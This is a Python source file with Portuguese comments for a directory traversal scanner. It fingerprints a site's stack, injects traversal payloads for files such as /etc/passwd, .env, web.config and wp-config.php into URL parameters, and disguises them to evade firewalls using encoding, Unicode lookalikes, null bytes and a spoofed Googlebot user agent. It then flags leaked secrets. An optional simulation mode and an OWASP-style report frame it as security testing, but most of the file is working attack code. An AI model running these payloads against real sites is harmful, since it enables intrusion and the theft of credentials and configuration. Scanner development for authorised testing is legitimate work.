"""
Scanner de Directory Traversal
Vamos ver se a gente consegue dar uma espiadinha em pastas que não deveríamos.
Tipo tentar ler o /etc/passwd num site.
"""

from scans.base_scanner import BaseScanner
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
import re
import time
import hashlib
import random
import asyncio
import aiohttp
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class DirectoryTraversalScanner(BaseScanner):
    def __init__(self, target_url, timeout=10, max_concurrent=5, safe_mode=True):
        super().__init__(target_url, timeout)
        self.safe_mode = safe_mode
        self.max_concurrent = max_concurrent
        self.detected_tech_stack = {}
        self.audit_log = []
        self.randomized_payloads = []
        
        self.environment_info = {
            'os_type': 'unknown',
            'web_server': 'unknown',
            'programming_language': 'unknown',
            'framework': 'unknown'
        }
    
    async def detect_technology_stack(self):
        """Tenta adivinhar qual a tecnologia do site pra gente ser mais esperto nos ataques."""
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
                async with session.get(self.target_url) as response:
                    headers = response.headers
                    server_header = headers.get('Server', '').lower()
                    powered_by = headers.get('X-Powered-By', '').lower()
                    
                    if 'windows' in server_header or 'iis' in server_header:
                        self.environment_info['os_type'] = 'windows'
                    elif 'linux' in server_header or 'ubuntu' in server_header or 'centos' in server_header:
                        self.environment_info['os_type'] = 'linux'
                    elif 'apache' in server_header or 'nginx' in server_header:
                        self.environment_info['os_type'] = 'linux'
                    
                    if 'apache' in server_header: self.environment_info['web_server'] = 'apache'
                    elif 'nginx' in server_header: self.environment_info['web_server'] = 'nginx'
                    elif 'iis' in server_header: self.environment_info['web_server'] = 'iis'
                    
                    if 'php' in powered_by: self.environment_info['programming_language'] = 'php'
                    elif 'asp.net' in powered_by or 'asp' in powered_by: self.environment_info['programming_language'] = 'asp.net'
                    elif 'python' in powered_by or 'django' in powered_by or 'flask' in powered_by: self.environment_info['programming_language'] = 'python'
                    elif 'node' in powered_by or 'express' in powered_by: self.environment_info['programming_language'] = 'nodejs'
                    elif 'java' in powered_by or 'jsp' in powered_by: self.environment_info['programming_language'] = 'java'
                    
                    self.add_info(f"Stack detectada: OS={self.environment_info['os_type']}, Server={self.environment_info['web_server']}, Lang={self.environment_info['programming_language']}")
                    
        except Exception as e:
            self.add_warning(f"Erro na detecção de tecnologia: {e}")
    
    def get_environment_specific_payloads(self):
        """Pega os payloads certos dependendo se o sistema parece ser Linux ou Windows."""
        base_payloads = {
            'linux': {
                'system_files': ["../../../../etc/passwd", "../../../../etc/hosts"],
                'web_files': ["../../../../.htaccess", "../../../../var/www/html/index.php"]
            },
            'windows': {
                'system_files': ["..\\..\\..\\..\\windows\\win.ini", "..\\..\\..\\..\\boot.ini"],
                'web_files': ["..\\..\\..\\..\\inetpub\\wwwroot\\web.config"]
            },
            'unknown': {
                'system_files': ["../../../../etc/passwd"],
                'web_files': ["../../../../.env"]
            }
        }
        
        language_payloads = {
            'php': ["../../../../wp-config.php"],
            'asp.net': ["../../../../web.config"],
            'python': ["../../../../.env.local"],
            'nodejs': ["../../../../package.json"],
            'java': ["../../../../WEB-INF/web.xml"]
        }
        
        os_type = self.environment_info['os_type']
        language = self.environment_info['programming_language']
        
        payloads = base_payloads.get(os_type, base_payloads['unknown'])
        
        if language in language_payloads:
            payloads['language_files'] = language_payloads[language]
        
        return payloads
    
    def generate_randomized_payloads(self):
        """Cria umas variações dos payloads pra tentar enganar firewalls."""
        base_payloads = self.get_environment_specific_payloads()
        randomized = []
        
        for category, payload_list in base_payloads.items():
            for payload in payload_list:
                variations = self.apply_obfuscation_techniques(payload)
                randomized.extend(variations[:2])
        
        random.shuffle(randomized)
        return randomized
    
    def apply_obfuscation_techniques(self, payload):
        """Aplica uns truques pra 'maquiar' os payloads."""
        variations = [payload]
        variations.append(quote(payload))
        variations.append(quote(quote(payload)))
        variations.append(payload.replace('/', '\u2215').replace('.', '\u2024'))
        
        char_list = list(payload)
        for i in range(min(3, len(char_list))):
            if char_list[i].isalpha():
                char_list[i] = char_list[i].upper() if random.random() > 0.5 else char_list[i].lower()
        variations.append(''.join(char_list))
        
        if random.random() > 0.7:
            variations.append(payload.replace('../', '../\x00../'))
        
        return variations
    
    def calculate_response_similarity(self, response1, response2):
        """Compara duas respostas pra ver o quão parecidas elas são."""
        if not response1 or not response2: return 0
        
        content1 = response1.text
        content2 = response2.text
        
        hash1 = hashlib.sha256(content1.encode()).hexdigest()
        hash2 = hashlib.sha256(content2.encode()).hexdigest()
        
        if hash1 == hash2: return 1.0
        
        size_ratio = min(len(content1), len(content2)) / max(len(content1), len(content2))
        entropy1 = len(set(content1)) / len(content1) if content1 else 0
        entropy2 = len(set(content2)) / len(content2) if content2 else 0
        entropy_diff = abs(entropy1 - entropy2)
        
        similarity = (size_ratio * 0.6) + ((1 - entropy_diff) * 0.4)
        return similarity
    
    async def test_payload_async(self, session, test_url, payload, baseline_response):
        """Testa um payload de cada vez, de forma assíncrona."""
        if self.safe_mode:
            return self.simulate_payload_test(test_url, payload)
        
        try:
            async with session.get(test_url) as response:
                content = await response.text()
                analysis = self.analyze_traversal_response(content, payload, baseline_response, response.status)
                
                if analysis['is_vulnerable']:
                    return {
                        'url': test_url,
                        'payload': payload,
                        'status': response.status,
                        'evidence': analysis['evidence'],
                        'confidence': analysis['confidence']
                    }
                
        except Exception as e:
            self.add_warning(f"Erro ao testar payload {payload}: {e}")
        
        return None
    
    def analyze_traversal_response(self, content, payload, baseline_response, status_code):
        """Analisa a resposta do site pra ver se nosso ataque funcionou."""
        analysis = {'is_vulnerable': False, 'confidence': 'low', 'evidence': ''}
        if status_code not in [200, 206]: return analysis
        
        sensitive_patterns = self.get_sensitive_content_patterns()
        
        for pattern_name, patterns in sensitive_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE | re.MULTILINE):
                    analysis['is_vulnerable'] = True
                    analysis['confidence'] = 'high'
                    analysis['evidence'] = f"Padrão {pattern_name} detectado"
                    return analysis
        
        if baseline_response:
            similarity = self.calculate_response_similarity(baseline_response, type('MockResponse', (), {'text': content})())
            if similarity < 0.3:
                analysis['is_vulnerable'] = True
                analysis['confidence'] = 'medium'
                analysis['evidence'] = f"Conteúdo significativamente diferente (similaridade: {similarity:.2f})"
        
        path_disclosure = self.detect_path_disclosure_advanced(content)
        if path_disclosure:
            analysis['is_vulnerable'] = True
            analysis['confidence'] = 'medium'
            analysis['evidence'] = f"Path disclosure: {path_disclosure}"
        
        return analysis
    
    def get_sensitive_content_patterns(self):
        """Padrões de texto que indicam que a gente achou algo importante."""
        return {
            'etc_passwd': [r'root:.*:0:0:', r'\/bin\/(bash|sh)'],
            'windows_system': [r'\[boot loader\]', r'\[fonts\]'],
            'environment_vars': [r'PATH=.*', r'HOME=.*'],
            'web_configs': [r'DATABASE_URL=', r'SECRET_KEY='],
            'application_files': [r'from django\.', r'require\([\'"]', r'<?php']
        }
    
    def detect_path_disclosure_advanced(self, content):
        """Tenta achar vazamento de caminhos de pastas no conteúdo da página."""
        path_patterns = [
            r'\/home\/[a-zA-Z0-9_]+\/',
            r'C:\\[a-zA-Z0-9_\\]+\.(php|asp|jsp)',
            r'warning.*\/.*\.php.*line \d+',
            r'stack trace:.*\n.*at.*\(.*\.java:\d+\)',
        ]
        
        for pattern in path_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match: return match.group()
        
        return None
    
    def simulate_payload_test(self, test_url, payload):
        """No modo seguro, a gente só simula o teste, sem rodar de verdade."""
        analysis = {'url': test_url, 'payload': payload, 'status': 'simulated', 'evidence': 'Modo seguro - análise lógica', 'confidence': 'low'}
        
        suspicious_combinations = [('etc/passwd', 'linux'), ('windows/system32', 'windows')]
        
        for file_pattern, expected_os in suspicious_combinations:
            if file_pattern in payload and self.environment_info['os_type'] == expected_os:
                analysis['confidence'] = 'medium'
                analysis['evidence'] = f'Padrão {file_pattern} compatível com OS detectado'
                return analysis
        
        return None
    
    async def test_parameters_parallel(self, parameters):
        """Testa vários parâmetros de uma vez pra ser mais rápido."""
        vulnerabilities = []
        if self.safe_mode: self.add_info("🔒 Modo seguro ativo - simulando testes")
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=self.timeout), headers={'User-Agent': self.get_random_user_agent()}) as session:
            baseline_response = None
            if not self.safe_mode:
                async with session.get(self.target_url) as response:
                    baseline_content = await response.text()
                    baseline_response = type('MockResponse', (), {'text': baseline_content})()
            
            tasks = []
            for param, original_value in parameters.items():
                param_vulnerabilities = await self.test_parameter_parallel(session, param, original_value, baseline_response)
                vulnerabilities.extend(param_vulnerabilities)
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, dict) and result.get('is_vulnerable'):
                        vulnerabilities.append(result)
        
        return vulnerabilities
    
    async def test_parameter_parallel(self, session, param, original_value, baseline_response):
        vulnerabilities = []
        tested_payloads = 0
        
        for payload in self.randomized_payloads[:10]:
            if tested_payloads >= 3 and self.safe_mode: break
            
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            if param in params:
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                
                result = await self.test_payload_async(session, test_url, payload, baseline_response)
                if result:
                    vulnerabilities.append(result)
                    self.log_vulnerability(param, payload, result)
                
                tested_payloads += 1
                if not self.safe_mode: await asyncio.sleep(0.1)
        
        return vulnerabilities
    
    def get_random_user_agent(self):
        """Pega um disfarce (User-Agent) aleatório."""
        user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Googlebot/2.1 (+http://www.google.com/bot.html)"]
        return random.choice(user_agents)
    
    def log_vulnerability(self, parameter, payload, result):
        """Registra a vulnerabilidade que a gente achou."""
        vulnerability = {
            'timestamp': datetime.now().isoformat(),
            'parameter': parameter,
            'payload': payload,
            'confidence': result['confidence'],
            'evidence': result['evidence'],
            'url': result['url'],
            'environment': self.environment_info
        }
        self.audit_log.append(vulnerability)
        
        if result['confidence'] == 'high':
            self.add_vulnerability(f"Directory Traversal confirmado no parâmetro '{parameter}' - {result['evidence']}")
        else:
            self.add_warning(f"Possível Directory Traversal no parâmetro '{parameter}' - {result['evidence']}")
    
    def generate_owasp_report(self, vulnerabilities):
        """Gera um relatório bonitinho no formato da OWASP."""
        report = {
            'scan_metadata': {'target': self.target_url, 'timestamp': datetime.now().isoformat(), 'environment': self.environment_info, 'safe_mode': self.safe_mode, 'owasp_category': 'A5:2017-Broken Access Control'},
            'vulnerabilities': vulnerabilities,
            'risk_assessment': {'total_vulnerabilities': len(vulnerabilities), 'high_confidence_count': len([v for v in vulnerabilities if v.get('confidence') == 'high']), 'risk_level': 'HIGH' if len(vulnerabilities) > 0 else 'LOW', 'recommendations': ["Validar e sanitizar todos os inputs de arquivo/path", "Implementar whitelist de paths permitidos"]},
            'audit_trail': self.audit_log
        }
        return report
    
    async def scan_async(self):
        """Roda o scan de forma assíncrona."""
        print(f"    [+] Executando scan de Directory Traversal")
        if not self.is_valid_url():
            self.add_warning("URL inválida")
            return self.results
        
        start_time = time.time()
        
        try:
            print("    [+] Detectando stack tecnológica...")
            await self.detect_technology_stack()
            
            print("    [+] Gerando payloads adaptativos...")
            self.randomized_payloads = self.generate_randomized_payloads()
            self.add_info(f"Payloads gerados: {len(self.randomized_payloads)}")
            
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            suspicious_params = self.identify_traversal_parameters(params)
            
            if not suspicious_params:
                self.add_info("Nenhum parâmetro suspeito identificado")
                return self.results
            
            print(f"    [+] Testando {len(suspicious_params)} parâmetros em paralelo...")
            vulnerabilities = await self.test_parameters_parallel(suspicious_params)
            
            scan_duration = time.time() - start_time
            self.add_info(f"⏱️ Duração do scan: {scan_duration:.2f} segundos")
            
            owasp_report = self.generate_owasp_report(vulnerabilities)
            self.results['owasp_report'] = owasp_report
            self.results['vulnerabilities'] = vulnerabilities
            
        except Exception as e:
            self.add_warning(f"Erro durante scan: {str(e)}")
        
        return self.results
    
    def identify_traversal_parameters(self, params):
        """Identifica parâmetros que parecem suspeitos pra esse tipo de ataque."""
        traversal_keywords = ['file', 'path', 'document', 'page', 'template', 'load', 'include', 'url', 'doc', 'filename', 'folder']
        suspicious = {}
        for param, values in params.items():
            if any(keyword in param.lower() for keyword in traversal_keywords):
                suspicious[param] = values[0] if values else ''
        
        return suspicious
    
    def scan(self):
        """Método que inicia o scan (chama a versão assíncrona)."""
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(self.scan_async())
            loop.close()
            return result
        except RuntimeError:
            self.add_warning("Async não disponível - usando modo síncrono")
            return self.sync_scan_fallback()
    
    def sync_scan_fallback(self):
        """Um quebra-galho caso o modo assíncrono não funcione."""
        self.add_warning("Usando modo síncrono (performance reduzida)")
        return self.results
